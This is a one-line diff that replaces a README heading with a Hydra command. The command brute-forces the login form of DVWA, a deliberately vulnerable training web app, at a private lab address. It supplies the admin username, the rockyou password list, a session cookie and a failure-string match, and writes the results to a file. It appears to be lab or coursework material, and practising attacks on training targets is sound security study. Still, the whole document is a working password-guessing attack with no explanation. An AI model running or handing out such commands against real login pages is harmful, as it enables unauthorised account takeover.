@@ -1,1 +1,1 @@
-# S-cuOS
+hydra -l admin -P /usr/share/wordlists/rockyou.txt 'http-get-form://192.168.186.5/DVWA/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:H=Cookie:PHPSESSID=rbdeiei3ts55k67tphm4mq05sg;security=low:F=Username\ and/or\ password\ incorrect' > brute_force.txt 
